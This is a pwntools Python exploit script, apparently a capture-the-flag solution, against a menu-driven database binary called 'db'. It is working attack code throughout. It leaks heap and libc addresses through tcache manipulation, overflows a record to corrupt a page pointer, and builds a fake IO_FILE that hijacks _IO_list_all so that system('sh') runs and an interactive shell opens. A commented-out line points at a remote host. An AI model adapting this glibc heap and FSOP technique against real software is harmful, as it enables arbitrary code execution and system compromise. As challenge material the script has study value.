from pwn import*
context(log_level='debug',arch='amd64',os='linux')
p = process("./db")
# p = remote("61.147.171.105",52702)
libc = ELF("./libc.so.6")
def create_table(idx):
    p.recvuntil(">>> ")
    p.sendline("1")
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def remove_table(idx):
    p.recvuntil(">>> ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def insert_record(idx,len,content):
    p.recvuntil(">>> ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Length: ")
    p.sendline(str(len))
    p.recvuntil("Varchar: ")
    p.send(content)

def get_record(idx,slot_id):
    p.recvuntil(">>> ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Slot ID: ")
    p.sendline(str(slot_id))

def edit_record(idx,slot_id,len,content):
    p.recvuntil(">>> ")
    p.sendline("5")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Slot ID: ")
    p.sendline(str(slot_id))
    p.recvuntil("Length: ")
    p.sendline(str(len))
    p.recvuntil("Varchar: ")
    p.send(content)

# leak libc first
# 整8个塞 tcache 里面吧
for i in range(9):
    create_table(i)
for i in range(203):
    insert_record(0,1,"A")
#insert vuln record
insert_record(0,6,b"\x02"*6)
for i in range(8):
    remove_table(8-i)

get_record(0,203)
p.recvline()
leaks = p.recv(0x140)
# 0x1d 0x106
heap_leak = u64(leaks[0xf2:0xf2 + 8])
print(hex(heap_leak))
libc_leak = u64(leaks[0x11a:(0x11a + 8)])
print(hex(libc_leak))
heap_base = heap_leak - 0x12320
# 0x7fbd726c7ce0 - 0x7fbd724ad000
libc_base = libc_leak - 0x21ace0
print(hex(heap_base))
print(hex(libc_base))
# 把所有堆块都占住 然后改 page_ 指针
for i in range(8):
    create_table(i+1)
# 占一个堆块写 fake IO_file
fake_io_addr = heap_base + 0x12730 +0x430 - 0xf0 # TODO
system_addr=libc_base+libc.sym["system"]
fake_io_file=b"  sh;".ljust(0x8,b"\x00") 
fake_io_file+=p64(0)*3+p64(1)+p64(2)
fake_io_file=fake_io_file.ljust(0x30,b"\x00")
fake_io_file+=p64(0)
fake_io_file=fake_io_file.ljust(0x68,b"\x00")
fake_io_file+=p64(system_addr)
fake_io_file=fake_io_file.ljust(0x88,b"\x00")
fake_io_file+=p64(libc_base+0x21ca60) # lock
fake_io_file=fake_io_file.ljust(0xa0,b"\x00")
fake_io_file+=p64(fake_io_addr)
fake_io_file=fake_io_file.ljust(0xd8,b"\x00")
fake_io_file+=p64(0x216f40+libc_base) # 使得可以调用 _IO_wfile_overflow
fake_io_file+=p64(fake_io_addr)+p64(0) # 0xf0
# 直接溢出改 page_ 指针
insert_record(1,0xf0,fake_io_file)

payload = b"\x02"*6+b"a"*203 + p64(0)+p64(0x31)+p64(heap_base + 0x12320)*2+p64(libc_base + libc.sym["_IO_list_all"]+0x8)+p64(heap_base + 0x12320)
edit_record(0,203,0x140,payload)
insert_record(8,0x8,p64(fake_io_addr))

# trigger!
p.recvuntil(">>> ")
p.sendline("6")

p.interactive()